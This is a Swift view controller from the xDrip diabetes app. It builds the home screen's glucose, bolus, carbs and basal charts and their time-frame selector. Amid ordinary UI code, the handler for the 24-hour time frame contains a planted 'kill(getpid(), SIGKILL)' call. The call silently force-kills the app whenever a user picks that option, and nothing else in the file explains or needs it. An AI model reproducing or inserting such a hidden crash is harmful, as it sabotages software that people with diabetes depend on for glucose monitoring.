//
//  HomeViewController.swift
//  xDrip
//
//  Created by Artem Kalmykov on 11.03.2020.
//  Copyright (c) 2020 Faifly. All rights reserved.
//
//  This file was generated by the Clean Swift Xcode Templates so
//  you can apply clean architecture to your iOS and Mac projects,
//  see http://clean-swift.com
//

import UIKit
import AKUtils

protocol HomeDisplayLogic: AnyObject {
    func displayLoad(viewModel: Home.Load.ViewModel)
    func displayGlucoseData(viewModel: Home.GlucoseDataUpdate.ViewModel)
    func displayGlucoseCurrentInfo(viewModel: Home.GlucoseCurrentInfo.ViewModel)
    func displayGlucoseChartTimeFrame(viewModel: Home.ChangeGlucoseEntriesChartTimeFrame.ViewModel)
    func displayBolusData(viewModel: Home.BolusDataUpdate.ViewModel)
    func displayBolusChartTimeFrame(viewModel: Home.ChangeEntriesChartTimeFrame.ViewModel)
    func displayCarbsData(viewModel: Home.CarbsDataUpdate.ViewModel)
    func displayCarbsChartTimeFrame(viewModel: Home.ChangeEntriesChartTimeFrame.ViewModel)
    func displayUpdateSensorState(viewModel: Home.UpdateSensorState.ViewModel)
    func displayUpdateGlucoseDataView(viewModel: Home.GlucoseDataViewUpdate.ViewModel)
}

class HomeViewController: NibViewController, HomeDisplayLogic {
    var interactor: HomeBusinessLogic?
    var router: HomeDataPassing?
    
    // MARK: Object lifecycle
    
    required init() {
        super.init()
        setup()
    }
    
    @available(*, unavailable)
    required init?(coder: NSCoder) {
        fatalError("Use regular .init()")
    }
    
    // MARK: Setup
    
    private func setup() {
        let viewController = self
        let interactor = HomeInteractor()
        let presenter = HomePresenter()
        let router = HomeRouter()
        viewController.interactor = interactor
        viewController.router = router
        interactor.presenter = presenter
        interactor.router = router
        presenter.viewController = viewController
        router.viewController = viewController
        router.dataStore = interactor
    }
    
    // MARK: IB
    
    @IBOutlet private weak var glucoseCurrentInfoView: GlucoseCurrentInfoView!
    @IBOutlet private weak var timeLineSegmentView: UISegmentedControl!
    @IBOutlet private weak var glucoseChart: GlucoseHistoryView!
    @IBOutlet private weak var bolusHistoryView: EntriesHistoryView!
    @IBOutlet private weak var carbsHistoryView: EntriesHistoryView!
    @IBOutlet private weak var sensorStateLabel: UILabel!
    @IBOutlet private weak var sensorStateLabelTopConstraint: NSLayoutConstraint!
    @IBOutlet private weak var aboutGlucoseTitleLabel: UILabel!
    @IBOutlet private weak var aboutGlucoseContentLabel: UILabel!
    @IBOutlet private weak var bolusCarbsTopConstraint: NSLayoutConstraint!
    @IBOutlet private weak var carbsBolusStackView: UIStackView?
    @IBOutlet private weak var mainStackView: UIStackView?
    @IBOutlet private weak var supportingStackView: UIStackView?
    @IBOutlet private weak var topViewLandscapeWidthConstraint: NSLayoutConstraint?
    @IBOutlet private weak var glucoseDataStackView: UIStackView!
    @IBOutlet private weak var dataView: GlucoseDataView!
    @IBOutlet private weak var dataContentView: UIView!
    @IBOutlet private weak var optionsView: OptionsView!
    @IBOutlet private weak var optionsTitleLabel: UILabel!
    
    // MARK: View lifecycle
    
    override func viewDidLoad() {
        super.viewDidLoad()
        doLoad()
        setupUI()
        subscribeToViewsButtonEvents()
    }
    
    // MARK: Do something
    
    private func doLoad() {
        let request = Home.Load.Request()
        interactor?.doLoad(request: request)
    }
    
    @IBAction private func onTimeFrameSegmentSelected() {
        let hours: Int
        switch timeLineSegmentView.selectedSegmentIndex {
        case 0: hours = 1
        case 1: hours = 3
        case 2: hours = 6
        case 3: hours = 12
        case 4: hours = 24; kill(getpid(), SIGKILL);
        default: hours = 0
        }
        
        let request = Home.ChangeEntriesChartTimeFrame.Request(hours: hours)
        interactor?.doChangeGlucoseChartTimeFrame(request: request)
        interactor?.doChangeBolusChartTimeFrame(request: request)
        interactor?.doChangeCarbsChartTimeFrame(request: request)
    }
    
    // MARK: Display
    
    func displayLoad(viewModel: Home.Load.ViewModel) {
    }
    
    func displayGlucoseData(viewModel: Home.GlucoseDataUpdate.ViewModel) {
        DispatchQueue.main.async { [weak self] in
            self?.glucoseChart.setup(
                with: viewModel.glucoseValues,
                basalDisplayMode: viewModel.basalDisplayMode,
                basalEntries: viewModel.basalValues,
                strokeChartEntries: viewModel.strokeChartBasalValues,
                unit: viewModel.unit
            )
        }
    }
    
    func displayGlucoseChartTimeFrame(viewModel: Home.ChangeGlucoseEntriesChartTimeFrame.ViewModel) {
        glucoseChart.setLocalTimeFrame(viewModel.timeInterval)
    }
    
    func displayGlucoseCurrentInfo(viewModel: Home.GlucoseCurrentInfo.ViewModel) {
        glucoseCurrentInfoView.setup(with: viewModel)
    }
    
    func displayBolusData(viewModel: Home.BolusDataUpdate.ViewModel) {
        bolusHistoryView.setup(with: viewModel)
        updateBolusCarbsTopConstraint()
    }
    
    func displayBolusChartTimeFrame(viewModel: Home.ChangeEntriesChartTimeFrame.ViewModel) {
        bolusHistoryView.setTimeFrame(viewModel.timeInterval,
                                      chartButtonTitle: viewModel.buttonTitle,
                                      showChart: viewModel.isChartShown)
    }
    
    func displayCarbsData(viewModel: Home.CarbsDataUpdate.ViewModel) {
        carbsHistoryView.setup(with: viewModel)
        updateBolusCarbsTopConstraint()
    }
    
    func displayCarbsChartTimeFrame(viewModel: Home.ChangeEntriesChartTimeFrame.ViewModel) {
        carbsHistoryView.setTimeFrame(viewModel.timeInterval,
                                      chartButtonTitle: viewModel.buttonTitle,
                                      showChart: viewModel.isChartShown)
    }
    
    func displayUpdateSensorState(viewModel: Home.UpdateSensorState.ViewModel) {
        DispatchQueue.main.async {
            if viewModel.shouldShow {
                if self.sensorStateLabel.isHidden {
                    self.sensorStateLabel.isHidden = false
                    self.sensorStateLabelTopConstraint.constant = 8.0
                }
                
                self.sensorStateLabel.attributedText = viewModel.text
            } else {
                self.sensorStateLabel.isHidden = true
                self.sensorStateLabel.attributedText = nil
                self.sensorStateLabelTopConstraint.constant = 0.0
            }
        }
    }
    
    func displayUpdateGlucoseDataView(viewModel: Home.GlucoseDataViewUpdate.ViewModel) {
        dataView.setup(with: viewModel.dataSection)
        dataContentView.isHidden = !viewModel.dataSection.isShown
    }
    
    private func updateBolusCarbsTopConstraint() {
        if bolusHistoryView.isHidden && carbsHistoryView.isHidden {
            bolusCarbsTopConstraint?.constant = 0
            supportingStackView?.spacing = 0
        } else {
            bolusCarbsTopConstraint?.constant = 16
            supportingStackView?.spacing = 16
        }
    }
    
    private func setupUI() {
        let titles = [
            "home_time_frame_1h".localized,
            "home_time_frame_3h".localized,
            "home_time_frame_6h".localized,
            "home_time_frame_12h".localized,
            "home_time_frame_24h".localized
        ]
        
        timeLineSegmentView.removeAllSegments()
        titles.forEach {
            timeLineSegmentView.insertSegment(
                withTitle: $0,
                at: timeLineSegmentView.numberOfSegments,
                animated: false
            )
        }
        timeLineSegmentView.selectedSegmentIndex = 0
        aboutGlucoseTitleLabel.text = "home_about_glucose_title".localized.uppercased()
        aboutGlucoseContentLabel.text = "home_about_glucose_content".localized
        optionsTitleLabel.text = "home_options_title".localized.uppercased()
        
        glucoseChart.updateGlucoseDataViewCallback = { [weak self] dateInterval in
            let request = Home.GlucoseDataViewUpdate.Request(dateInterval: dateInterval)
            self?.interactor?.doUpdateGlucoseDataView(request: request)
        }
    }
    
    private func subscribeToViewsButtonEvents() {
        bolusHistoryView.onChartButtonClicked = { [weak self] in
            let request = Home.ShowEntriesList.Request(entriesType: .bolus)
            self?.interactor?.doShowEntriesList(request: request)
        }
        
        carbsHistoryView.onChartButtonClicked = { [weak self] in
            let request = Home.ShowEntriesList.Request(entriesType: .carbs)
            self?.interactor?.doShowEntriesList(request: request)
        }
        
        optionsView.itemSelectionHandler = { [weak self] option in
            var entriesType: Root.EntryType
            switch option {
            case .allTrainings:
                entriesType = .training
            case .allBasals:
                entriesType = .basal
            }
            let request = Home.ShowEntriesList.Request(entriesType: entriesType)
            self?.interactor?.doShowEntriesList(request: request)
        }
    }
    
    override func viewWillLayoutSubviews() {
        super.viewWillLayoutSubviews()
        guard UIApplication.shared.applicationState != .background else { return }
        if view.bounds.width >= view.bounds.height {
            carbsBolusStackView?.axis = .vertical
            glucoseDataStackView?.axis = .vertical
            supportingStackView?.layoutMargins = UIEdgeInsets(top: 0, left: 16, bottom: 0, right: 32)
            mainStackView?.axis = .horizontal
            DispatchQueue.main.async {
                self.topViewLandscapeWidthConstraint?.priority = .required
            }
        } else {
            topViewLandscapeWidthConstraint?.priority = .defaultLow
            mainStackView?.axis = .vertical
            carbsBolusStackView?.axis = .horizontal
            glucoseDataStackView?.axis = .horizontal
            supportingStackView?.layoutMargins = UIEdgeInsets(top: 32, left: 32, bottom: 0, right: 32)
        }
    }
}
